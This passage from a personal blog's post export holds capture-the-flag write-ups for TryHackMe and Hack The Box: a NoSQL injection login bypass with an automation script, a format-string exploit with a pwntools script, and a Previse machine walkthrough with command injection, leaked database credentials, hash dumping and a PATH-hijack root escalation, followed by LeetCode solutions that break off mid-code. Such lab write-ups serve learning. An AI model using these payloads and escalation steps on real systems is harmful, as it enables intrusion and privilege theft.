flagdb\u0026gt; db.flagColl.find() [  {  _id: ObjectId(\u0026#34;618806af0afbc09bdf42bd6a\u0026#34;),  flag: \u0026#39;THM{8814a5e6662a9763f7df23ee59d944f9}\u0026#39;  } ] And that\u0026rsquo;s for our first task. Onto our second task - inject it.\nHere\u0026rsquo;s how its web interface look like in a browser: And if you take a look at DevTool while sending dummy username and password, you will understand what\u0026rsquo;s going on behind the scene: In short, it sends a POST request in plaintext to /login. So I tried to do it in the command line:\n$ curl -X POST -d \u0026#34;username=admin\u0026amp;password=admin\u0026#34; http://10.10.92.86/login {\u0026#34;msg\u0026#34;:\u0026#34;Bad Creds\u0026#34;} $ curl -X POST -d \u0026#34;username=admin\u0026amp;password[$ne]=admin\u0026#34; http://10.10.92.86/login {\u0026#34;msg\u0026#34;:\u0026#34;Bad Creds\u0026#34;} Oops, forgot to escape it.\n$ curl -X POST -d \u0026#34;username=admin\u0026amp;password[\\$ne]=admin\u0026#34; http://10.10.92.86/login Found. Redirecting to /dashboard It worked!\nThe rest of the task\u0026rsquo;s basically doing the same with [$ne] payload. Therefore, I automated it a bit with a Python script. Enjoy. :D\n#!/usr/bin/env python3 import requests, re  location = input(\u0026#34;Enter server\u0026#39;s address (default to http://0.0.0.0/): \u0026#34;) or \u0026#39;http://0.0.0.0/\u0026#39; location = [location if location[-1] == \u0026#39;/\u0026#39; else location + \u0026#39;/\u0026#39;][0] location = [location if location[0:4] == \u0026#39;http\u0026#39; else \u0026#39;http://\u0026#39; + location][0]  def login(session):  credentials = {\u0026#39;username\u0026#39;: \u0026#39;admin\u0026#39;, \u0026#39;password[$ne]\u0026#39;: \u0026#39;admin\u0026#39;}  response = session.post(location + \u0026#39;login\u0026#39;, data=credentials)  print(\u0026#34;Logged in successfully\u0026#34;)  def getFlag1(session):  response = session.get(location + \u0026#39;flag\u0026#39;)  epr = re.compile(\u0026#34;(THM\\{.+\\})\u0026#34;)  print(\u0026#34;Your first flag is: {}\u0026#34;.format(epr.search(response.text).group(0)))  def getFlag2(session):  params = {\u0026#34;username[$ne]\u0026#34;: \u0026#34;lmao\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;guest\u0026#34;}  response = session.get(location + \u0026#39;search\u0026#39;, params=params)  epr = re.compile(\u0026#34;(THM\\{.+\\})\u0026#34;)  print(\u0026#34;Your second flag is: {}\u0026#34;.format(epr.search(response.text).group(0)))  def getFlag3(session):  params = {\u0026#34;username[$ne]\u0026#34;: \u0026#34;lmao\u0026#34;, \u0026#34;role[$ne]\u0026#34;: \u0026#34;lmao\u0026#34;}  response = session.get(location + \u0026#39;search\u0026#39;, params=params)  epr = re.compile(\u0026#34;(ID:[0-9a-z]*:mcskidy:[a-z]*)\u0026#34;)  print(\u0026#34;Your last flag is: {}\u0026#34;.format(epr.search(response.text).group(0)))  def main():  session = requests.Session()  login(session)  getFlag1(session)  getFlag2(session)  getFlag3(session)  if __name__ == \u0026#39;__main__\u0026#39;:  main() \u0026hellip; You can pretty much do the same with BurpSuite, even faster. However, Burp\u0026rsquo;ll eat up all RAM and halt this ancient laptop of mine, so no Burp for me. (;-;)\nAnd that\u0026rsquo;s for today\u0026rsquo;s challenge!\nInteract with the MongoDB server to find the flag. What is the flag? THM{8814a5e6662a9763f7df23ee59d944f9}\nWe discussed how to bypass login pages as an admin. Can you log into the application that Grinch Enterprise controls as admin and retrieve the flag? THM{b6b304f5d5834a4d089b570840b467a8}\nOnce you are logged in, use the gift search page to list all usernames that have guest roles. What is the flag? THM{2ec099f2d602cc4968c5267970be1326}\nUse the gift search page to perform NoSQL injection and retrieve the mcskidy record. What is the details record? ID:6184f516ef6da50433f100f4:mcskidy:admin\n ","permalink":"https://git-akihakune.github.io/blog/adventofcyber3-2/","summary":"Writeup for 2021 Try Hack Me\u0026rsquo;s Advent of Cyber 3 (part 2)","title":"Try Hack Me - Advent Of Cyber 3 writeup (Part 2)"},{"content":"Short summary:\n Here\u0026rsquo;s the challenge: racecar.zip, zip password is hackthebox Good luck writing your pwn script   So, it\u0026rsquo;s a pwn challenge. For those first-timers, basically you\u0026rsquo;re given a program that\u0026rsquo;s also being run on a server. The task is to find a flaw in that program so that you can retrieve the real flag from the server.\nThis time, we\u0026rsquo;re given a binary file named racecar. You can grab the binary and try it out yourself, since it\u0026rsquo;s a fun challenge.\nFirst things first, let\u0026rsquo;s check what\u0026rsquo;s it.\n$ file racecar racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped ELF binary, not stripped - which means debugging information\u0026rsquo;s still there. So let\u0026rsquo;s find out what it has.\n$ readelf -s racecar 1 ⨯  Symbol table \u0026#39;.dynsym\u0026#39; contains 27 entries:  Num: Value Size Type Bind Vis Ndx Name  0: 00000000 0 NOTYPE LOCAL DEFAULT UND  1: 00000000 0 FUNC GLOBAL DEFAULT UND strcmp@GLIBC_2.0 (2)  2: 00000000 0 FUNC GLOBAL DEFAULT UND read@GLIBC_2.0 (2)  3: 00000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterT[...]  4: 00000000 0 FUNC GLOBAL DEFAULT UND printf@GLIBC_2.0 (2)  5: 00000000 0 FUNC GLOBAL DEFAULT UND fgets@GLIBC_2.0 (2)  6: 00000000 0 FUNC GLOBAL DEFAULT UND time@GLIBC_2.0 (2)  7: 00000000 0 FUNC GLOBAL DEFAULT UND sleep@GLIBC_2.0 (2)  8: 00000000 0 FUNC GLOBAL DEFAULT UND alarm@GLIBC_2.0 (2)  9: 00000000 0 FUNC GLOBAL DEFAULT UND __[...]@GLIBC_2.4 (3)  10: 00000000 0 FUNC WEAK DEFAULT UND [...]@GLIBC_2.1.3 (4)  11: 00000000 0 FUNC GLOBAL DEFAULT UND malloc@GLIBC_2.0 (2)  12: 00000000 0 FUNC GLOBAL DEFAULT UND puts@GLIBC_2.0 (2)  13: 00000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__  14: 00000000 0 FUNC GLOBAL DEFAULT UND exit@GLIBC_2.0 (2)   ... # and a lot more so I\u0026#39;ll just skip straight to needed part   84: 00000000 0 OBJECT GLOBAL DEFAULT UND stdout@@GLIBC_2.0  85: 00004010 0 NOTYPE GLOBAL DEFAULT 24 __bss_start  86: 000013e1 168 FUNC GLOBAL DEFAULT 14 main  87: 00004008 4 OBJECT GLOBAL DEFAULT 23 coins  88: 00001500 20 FUNC GLOBAL HIDDEN 14 __stack_chk_fail[...]  89: 0000400c 4 OBJECT GLOBAL DEFAULT 23 check  90: 00000000 0 FUNC GLOBAL DEFAULT UND atoi@@GLIBC_2.0  91: 00004010 0 OBJECT GLOBAL HIDDEN 23 __TMC_END__  92: 00000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMC[...]  93: 00000618 0 FUNC GLOBAL DEFAULT 11 _init  94: 00001082 336 FUNC GLOBAL DEFAULT 14 info  95: 00000b93 111 FUNC GLOBAL DEFAULT 14 setup See that main function? We go there. :D\nHere\u0026rsquo;s what I\u0026rsquo;d got in Ghidra:\n /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */  void main(void)  {  int iVar1;  int iVar2;  int in_GS_OFFSET;   iVar1 = *(int *)(in_GS_OFFSET + 0x14);  setup();  banner();  info();  while (check != 0) {  iVar2 = menu();  if (iVar2 == 1) {  car_info();  }  else {  if (iVar2 == 2) {  check = 0;  car_menu();  }  else {  printf(\u0026#34;\\n%s[-] Invalid choice!%s\\n\u0026#34;,\u0026amp;DAT_00011548,\u0026amp;DAT_00011538);  }  }  }  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {  __stack_chk_fail_local();  }  return; } Already got the rough idea? I\u0026rsquo;ve checked car_info() and some other functions, but seems like car_menu() is the only one has some interesting bits to it. Here\u0026rsquo;s it:\n/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */  void car_menu(void)  {  int iVar1;  int iVar2;  uint __seed;  int iVar3;  size_t sVar4;  char *__format;  FILE *__stream;  int in_GS_OFFSET;  undefined *puVar5;  undefined4 uVar6;  undefined4 uVar7;  uint local_54;  char local_3c [44];  int local_10;   local_10 = *(int *)(in_GS_OFFSET + 0x14);  uVar6 = 0xffffffff;  uVar7 = 0xffffffff;  do {  printf(\u0026amp;DAT_00011948);  iVar1 = read_int(uVar6,uVar7);  if ((iVar1 != 2) \u0026amp;\u0026amp; (iVar1 != 1)) {  printf(\u0026#34;\\n%s[-] Invalid choice!%s\\n\u0026#34;,\u0026amp;DAT_00011548,\u0026amp;DAT_00011538);  }  } while ((iVar1 != 2) \u0026amp;\u0026amp; (iVar1 != 1));  iVar2 = race_type();  __seed = time((time_t *)0x0);  srand(__seed);  if (((iVar1 == 1) \u0026amp;\u0026amp; (iVar2 == 2)) || ((iVar1 == 2 \u0026amp;\u0026amp; (iVar2 == 2)))) {  iVar2 = rand();  iVar2 = iVar2 % 10;  iVar3 = rand();  iVar3 = iVar3 % 100;  }  else {  if (((iVar1 == 1) \u0026amp;\u0026amp; (iVar2 == 1)) || ((iVar1 == 2 \u0026amp;\u0026amp; (iVar2 == 1)))) {  iVar2 = rand();  iVar2 = iVar2 % 100;  iVar3 = rand();  iVar3 = iVar3 % 10;  }  else {  iVar2 = rand();  iVar2 = iVar2 % 100;  iVar3 = rand();  iVar3 = iVar3 % 100;  }  }  local_54 = 0;  while( true ) {  sVar4 = strlen(\u0026#34;\\n[*] Waiting for the race to finish...\u0026#34;);  if (sVar4 \u0026lt;= local_54) break;  putchar((int)\u0026#34;\\n[*] Waiting for the race to finish...\u0026#34;[local_54]);  if (\u0026#34;\\n[*] Waiting for the race to finish...\u0026#34;[local_54] == \u0026#39;.\u0026#39;) {  sleep(0);  }  local_54 = local_54 + 1;  }  if (((iVar1 == 1) \u0026amp;\u0026amp; (iVar2 \u0026lt; iVar3)) || ((iVar1 == 2 \u0026amp;\u0026amp; (iVar3 \u0026lt; iVar2)))) {  printf(\u0026#34;%s\\n\\n[+] You won the race!! You get 100 coins!\\n\u0026#34;,\u0026amp;DAT_00011540);  coins = coins + 100;  puVar5 = \u0026amp;DAT_00011538;  printf(\u0026#34;[+] Current coins: [%d]%s\\n\u0026#34;,coins,\u0026amp;DAT_00011538);  printf(\u0026#34;\\n[!] Do you have anything to say to the press after your big victory?\\n\u0026gt; %s\u0026#34;,  \u0026amp;DAT_000119de);  __format = (char *)malloc(0x171);  __stream = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;);  if (__stream == (FILE *)0x0) {  printf(\u0026#34;%s[-] Could not open flag.txt. Please contact the creator.\\n\u0026#34;,\u0026amp;DAT_00011548,puVar5);  /* WARNING: Subroutine does not return */  exit(0x69);  }  fgets(local_3c,0x2c,__stream);  read(0,__format,0x170);  puts(  \u0026#34;\\n\\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \\x1b[0m\u0026#34;  );  printf(__format);  }  else {  if (((iVar1 == 1) \u0026amp;\u0026amp; (iVar3 \u0026lt; iVar2)) || ((iVar1 == 2 \u0026amp;\u0026amp; (iVar2 \u0026lt; iVar3)))) {  printf(\u0026#34;%s\\n\\n[-] You lost the race and all your coins!\\n\u0026#34;,\u0026amp;DAT_00011548);  coins = 0;  printf(\u0026#34;[+] Current coins: [%d]%s\\n\u0026#34;,0,\u0026amp;DAT_00011538);  }  }  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {  __stack_chk_fail_local();  }  return; } You can carefully examine it for studying purpose, but to keep it short, basically it\u0026rsquo;s:\n If you choose car 1 and race 2, or car 2 and race 1, you win When you win, it let you input something there, and print it back out  Here\u0026rsquo;s what would happen: Now that we\u0026rsquo;ve known what this program does, how to exploit it?\nSee this little, cute command somewhere on the 82th line of car_menu() function? :D\nprintf(__format); Yeah, as clear as day, a format string vulnerability!\nTry to insert a payload there:\n[!] Do you have anything to say to the press after your big victory? \u0026gt; %x%x  The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 57916200170 Well, it\u0026rsquo;s vulnerable.\nSince it\u0026rsquo;s quite troublesome to enter our payload each time, here\u0026rsquo;s an on-the-spot Python script to make our life easier. :D\n#!/usr/bin/env python3  from pwn import *  context.log_level = \u0026#39;ERROR\u0026#39;  def exploit(payload: str): \tconn = process(\u0026#39;./racecar\u0026#39;) \tconn.sendlineafter(b\u0026#39;Name\u0026#39;, b\u0026#39;aki\u0026#39;) \tconn.sendlineafter(b\u0026#39;Nickname\u0026#39;, b\u0026#39;aki\u0026#39;) \tconn.sendlineafter(b\u0026#39;selection\u0026#39;, b\u0026#39;2\u0026#39;) \tconn.sendlineafter(b\u0026#39;car\u0026#39;, b\u0026#39;1\u0026#39;) \tconn.sendlineafter(b\u0026#39;Circuit\u0026#39;, b\u0026#39;2\u0026#39;) \tconn.sendlineafter(b\u0026#39;victory?\u0026#39;, bytes(payload, encoding=\u0026#39;utf-8\u0026#39;)) \tconn.recv() \tprint(conn.recv().decode(\u0026#39;utf-8\u0026#39;)) \tconn.close()  if __name__ == \u0026#39;__main__\u0026#39;: \twhile True: \texploit(input(\u0026#39;Enter payload: \u0026#39;)) I also created a flag.txt contains only AAAA, since that\u0026rsquo;ll be 41414141 in hex - much easier to spot.\n[!] Do you have anything to say to the press after your big victory? \u0026gt; %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 0x568e4200 0x170 0x565c8d85 0x5 0x4c 0x26 0x1 0x2 0x565c996c 0x568e4200 0x568e4380 0x41414141 0xa414141 0xf7db0100 0xaf7cc300 0x565c9d58 0x565cbf8c 0xffda98c8 0x565c938d 0x565c9540 It\u0026rsquo;s the 12th! Now, do just the same with the server, we get:\n0x574361c0 0x170 0x56555d85 0x1 0x5e 0x26 0x1 0x2 0x5655696c 0x574361c0 0x57436340 0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368 0x6b633474 0x7d213f 0xf149d800 0xf7f9e3fc 0x56558f8c 0xfffe9b38 0x56556441 0x1 0xfffe9be4 0xfffe9bec It doesn\u0026rsquo;t make much sense, does it? So let\u0026rsquo;s spin up another convenient script:\n#!/usr/bin/env python3 import re  raw_flag = input(\u0026#34;Enter the raw data: \u0026#34;)  raw_flag = raw_flag.split()[::-1]  for i in range(len(raw_flag)): \traw_flag[i] = re.findall(\u0026#39;..\u0026#39;, raw_flag[i])  flag = [] for chars in raw_flag: \tword = \u0026#34;\u0026#34; \tfor char in chars[::-1]: \tif char != \u0026#39;0x\u0026#39;: \tword += chr(int(char, 16)) \tflag.append(word)  flag.reverse() print(\u0026#39;\u0026#39;.join(flag)) Since it\u0026rsquo;s not a piece of cake to filter out which bytes are meaningful, let\u0026rsquo;s just plug all retrieved data to the script, and whatever gibberish it yield out must contain our flag!\nIn case you\u0026rsquo;re curious, here\u0026rsquo;s that gibberish:\n]UV^\u0026amp;liUVÀaCW@cCWHTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}ØIñüãù÷UV8dUVä See our flag in the middle? :D\nAnd that\u0026rsquo;s it. Nice challenge!\n","permalink":"https://git-akihakune.github.io/blog/racecar/","summary":"A writeup for Hack The Box\u0026rsquo;s racecar pwn challenge","title":"Hack The Box Pwn challenge - racecar"},{"content":"I. Foothold It all began with a port scan:\n# Nmap 7.92 scan initiated Mon Dec 6 22:10:41 2021 as: nmap -sC -sV -oN nmap.txt 10.10.11.104 Nmap scan report for 10.10.11.104 Host is up (0.64s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http? | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-title: Previse Login |_Requested resource was login.php Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Dec 6 22:13:13 2021 -- 1 IP address (1 host up) scanned in 151.40 seconds I also ran a quick RustScan and set up a background nmap full ports scan, but seems like those 2 are the only ports opening. Also, since their version seems up-to-date (at the time of writing), looks like there\u0026rsquo;s no better attack vector than the web application.\n We\u0026rsquo;re greeted with this basic login form upon opening it in a web browser.\nTo be honest, the first time I got there, someone\u0026rsquo;d already pwned the system, and I easily managed to login using admin:admin. Not until I\u0026rsquo;d got the box and getting round to write this writeup that I belatedly realized: hell, it should not have been that straight-forward. So it took me about half an hour more to figure out the proper way to log in.\nChecking browser\u0026rsquo;s DevTool, we can clearly see that it just simply redirect us to login page if we\u0026rsquo;re not logged in.\nSo I fired up Burp Suite, intercepted the responses, change status from 302 Redirect to 200 OK, and I got in.\nAround this time, Gobuster returned with quite positive results:\n┌──(kali㉿kali)-[~/ctf/htb/Previse] └─$ gobuster dir -x php -u http://10.10.11.104 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.104 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Timeout: 10s =============================================================== 2021/12/07 23:13:31 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 302) [Size: 2801] [--\u0026gt; login.php] /download.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /login.php (Status: 200) [Size: 2224] /files.php (Status: 302) [Size: 4914] [--\u0026gt; login.php] /header.php (Status: 200) [Size: 980] /nav.php (Status: 200) [Size: 1248] /footer.php (Status: 200) [Size: 217] ... I manually checked all Status: 200 pages, and nav.php looked really promising.\n I reckoned that\u0026rsquo;s to render the navigation bar, along with header.php and footer.php.\nUsing the same Burp Suite technique, I got to Account and create an account of myself (later I realized that I didn\u0026rsquo;t need to, and shouldn\u0026rsquo;t have done that, since it\u0026rsquo;ll leave traces in the database, and in real-world scenarios, getting caught like that is not good).\nAfter logged in, we can download uploaded files of other users. And an user uploaded something that looks like the source code of this web app.\nBefore reading any further, you can try to grab the source code, and try to figure out the vulnerability by yourself!\n\u0026hellip;\nHave you done that? What\u0026rsquo;s the vulnerability? How long did it take?\nI reckon we all got the database credentials in config.php pretty quick:\n\u0026lt;?php  function connectDB(){  $host = \u0026#39;localhost\u0026#39;;  $user = \u0026#39;root\u0026#39;;  $passwd = \u0026#39;mySQL_p@ssw0rd!:)\u0026#39;;  $db = \u0026#39;previse\u0026#39;;  $mycon = new mysqli($host, $user, $passwd, $db);  return $mycon; }  ?\u0026gt;However, it took me half an hour to stumble upon this line in logs.php:\n$output = exec(\u0026#34;/usr/bin/python /opt/scripts/log_process.py {$_POST[\u0026#39;delim\u0026#39;]}\u0026#34;); With no validation whatsover, there\u0026rsquo;s a great chance that it\u0026rsquo;s a command execution vulnerability via POST request.\nAnd so, I got back to Burp Suite, intercepted the request, sent it to repeater, trial and error (I mean, a lot of attempts), and finally got a reverse shell back.\nAs expected, the reverse shell returned was owned by www-data which didn\u0026rsquo;t provide much privilege. However, since we\u0026rsquo;d already had the MySQL database credentials, it\u0026rsquo;s not hard to get all the password hashes.\n+----+------------+------------------------------------+ | id | username | password | +----+------------+------------------------------------+ | 1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | | 2 | ouiouioui | $1$🧂llol$bwR0QWQ73nPRaUpx0r2la1 | | 3 | cacapipi | $1$🧂llol$oQSn/sA4G3L1zmOigOBq6. | | 4 | peter | $1$🧂llol$.nhVJJDzQaIk8znez4dDH/ | | 5 | jappoo | $1$🧂llol$JeN.ad9Ib9Gi/B.zMvpEm/ | | 6 | hacker | $1$🧂llol$MHiYle9peb0qOKtGJWZ9S0 | | 7 | noobie | $1$🧂llol$QJyUxlZ0gphAKveVeBYGk. | | 8 | fignupafya | $1$🧂llol$sP8qi2I.K6urjPuzdGizl1 | | 9 | lmaolmao | $1$🧂llol$bT7q8rEMWewT0sa2T6FOx0 | +----+------------+------------------------------------+ Also, take a look at /etc/passwd, we have:\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin m4lwhere:x:1000:1000:m4lwhere:/home/m4lwhere:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false So our target should be m4lwhere user.\nAt this point, let\u0026rsquo;s just run John the Ripper (which I personally prefer over Hashcat, since configuring hardware things for hashcat in a virtual environment is quite daunting), and we\u0026rsquo;d got m4lwhere password.\nII. Privilege Escalation Logging in SSH with the credentials of m4lwhere, we\u0026rsquo;d got the user flag. Now it\u0026rsquo;s time for vertical privilege escalation!\nAfter some basic recons, this looks like the best shot we could have:\nm4lwhere@previse:~$ sudo -l [sudo] password for m4lwhere: User m4lwhere may run the following commands on previse:  (root) /opt/scripts/access_backup.sh So let\u0026rsquo;s go for it!\nm4lwhere@previse:~$ cat /opt/scripts/access_backup.sh #!/bin/bash  # We always make sure to store logs, we take security SERIOUSLY here  # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we\u0026#39;ll fix it later when there\u0026#39;s time  gzip -c /var/log/apache2/access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_access.gz gzip -c /var/www/file_access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_file_access.gz Can you spot the vulnerability? Are we seeing eye to eye, or looking at different things? :D\nI\u0026rsquo;ve to admit, at first, I digged deep into the date hole. date binary can provide file read access, so I struggled to change the system date to my payload, without-root-access. It was pure hell. After giving up on it, I took another look at access_backup.sh and, god, why was I so blind about that relative gzip? What about path injection?\nAt first, I tried to directly execute /bin/bash through that injection, but it didn\u0026rsquo;t work. So I tried a a workaround.\nI copied bash to home, made a bash script that set SUID and change user of that binary, change PATH to inject it, and got root. Here\u0026rsquo;s the script.\n#!/usr/bin/bash chown root:root bash chmod +s bash The whole process can be described as:\nm4lwhere@previse:~$ cp /bin/bash ~ m4lwhere@previse:~$ mv script.sh ~/gzip m4lwhere@previse:~$ export $PATH=/home/m4lwhere:$PATH m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh m4lwhere@previse:~$ bash -p root@previse:/home/m4lwhere$ And that\u0026rsquo;s it. The root flag! Don\u0026rsquo;t forget to clean up your traces, for practicing purposes and for later players, everyone. :D\n","permalink":"https://git-akihakune.github.io/blog/previse/","summary":"A writeup for Hack The Box - Previse machine","title":"Hack The Box - Previse writeup"},{"content":"These are my submissions from Leetcode, started from knowing nothing about advanced data structures and algorithms (and still is).\nRather than to show off my code, this article is more like a progress revision for my algo journey. Therefore, it\u0026rsquo;ll be regularly updated.\nWho knows, maybe after months of 40 hours a day practicing, I will take a look back and find out how sacrilegious my code once was. :D\nStarting point: 14 days study plan to crack algo First day: 704. Binary Search  Accepted Python code:\nclass Solution:  def search(self, nums: List[int], target: int) -\u0026gt; int:  high = len(nums)  low = 0  mid = (low + high) // 2   while low \u0026lt; high:  mid = (low + high) // 2  if nums[mid] != target and nums[mid] \u0026lt; target:  low = mid + 1  elif nums[mid] != target and nums[mid] \u0026gt; target:  high = mid  else:  return mid   return mid if nums[mid] == target else -1 Accepted C++ code:\nclass Solution { public:  int search(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) {  int high = nums.size(), low = 0;  int mid = (high + low) / 2;   while (low \u0026lt; high) {  mid = (high + low) / 2;  if (nums[mid] \u0026lt; target)  low = mid + 1;  else if (nums[mid] \u0026gt; target)  high = mid;  else  return mid;  }   return -1;  } }; First day: 278. First Bad version  Accepted Python solution:\n# The isBadVersion API is already defined for you. # @param version, an integer # @return an integer # def isBadVersion(version):  class Solution:  def firstBadVersion(self, n):  \u0026#34;\u0026#34;\u0026#34; :type n: int :rtype: int \u0026#34;\u0026#34;\u0026#34;  high: int = n  low: int = 1   mid: int = low + (high - low) // 2   while low \u0026lt; high:  mid = low + (high - low) // 2   if isBadVersion(mid):  high = mid  else:  low = mid + 1   return low Accepted C++ solution:\n// The API isBadVersion is defined for you. // bool isBadVersion(int version);  class Solution { public:  int firstBadVersion(int n) {  int high = n, low = 1;  int mid = low + (high - low) / 2;   while (low \u0026lt; high) {  mid = low + (high - low) / 2;   if (isBadVersion(mid))  high = mid;  else  low = mid + 1;  }   return low;  } }; First day: 35. Search Insert Position  Accepted C++ solution:\nclass Solution { public:  int searchInsert(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) {  int high = nums.size(), low = 0;  int mid;   while (low \u0026lt; high) {  mid = low + (high - low) / 2;   if (nums[mid] \u0026lt; target)  low = mid + 1;  else  high = mid;  }   return high;  } }; Another accepted C++ solution, but took 9 ms more:\nclass Solution { public:  int searchInsert(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) {  return lower_bound(nums.begin(), nums.end(), target) - nums.begin();  } }; Accepted Python solution:\nclass Solution:  def searchInsert(self, nums: List[int], target: int) -\u0026gt; int:  high: int = len(nums)  low: int = 0   while low \u0026lt; high:  mid = (low + high) // 2   if nums[mid] \u0026lt; target:  low = mid + 1  else:  high = mid   return high This one ran slower, while taking less space:\nclass Solution:  def searchInsert(self, nums: List[int], target: int) -\u0026gt; int:  return bisect_left(nums, target) Even though they are practically the same algorithm\u0026hellip; How could it be??\nDay 2: 977. Squares of a Sorted Array  Accepted Python solution:\nclass Solution:  def sortedSquares(self, nums: List[int]) -\u0026gt; List[int]:  # Handling edge case  if not len(nums) \u0026gt; 3:  return sorted([i*i for i in nums])   # Set dead end on a side  MAX_INTERGER_VALUE: int = 10**4  nums.append(MAX_INTERGER_VALUE + 1)   # Get the position of the number  # that\u0026#39;s nearest to 0  zeroPosition = bisect_right(nums, 0)   left: int = zeroPosition - 1  right: int = zeroPosition  answer = []   while left \u0026gt;= 0 or right \u0026lt; len(nums):  if abs(nums[left]) \u0026lt; abs(nums[right]):  answer.append(nums[left]**2)  left -= 1  else:  answer.append(nums[right]**2)  right += 1   if left == -1 and right + 1 == len(nums):  answer.append(nums[right]**2)  break  if right == len(nums) and left == 0:  answer.append(nums[left]**2)  break    return answer[:-1] Another one, ran faster while taking 2KB more space:\nclass Solution:  def sortedSquares(self, nums: List[int]) -\u0026gt; List[int]:  return sorted([i*i for i in nums]) WHY???\nHere\u0026rsquo;s my first C++ solution:\nclass Solution { public:  vector\u0026lt;int\u0026gt; sortedSquares(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  // Get index of first positive number  int firstPositiveNumber = 0;  while (firstPositiveNumber \u0026lt; nums.size() \u0026amp;\u0026amp; nums.at(firstPositiveNumber) \u0026lt; 0) ++firstPositiveNumber;   int negative = firstPositiveNumber - 1, positive = firstPositiveNumber;  vector\u0026lt;int\u0026gt; answer;   while (negative \u0026gt;= 0 \u0026amp;\u0026amp; positive \u0026lt; nums.size()) {  if (nums.at(negative) * -1 \u0026lt; nums.at(positive)) {  answer.push_back(nums.at(negative) * nums.at(negative));  --negative;  }  else {  answer.push_back(nums.at(positive) * nums.at(positive));  ++positive;  }  }   while (negative \u0026gt;= 0) {  answer.push_back(nums.at(negative) * nums.at(negative));  --negative;  }  while (positive \u0026lt; nums.size()) {  answer.push_back(nums.at(positive) * nums.at(positive));  ++positive;  }   return answer;  } }; Another C++ one:\nclass Solution { public:  vector\u0026lt;int\u0026gt; 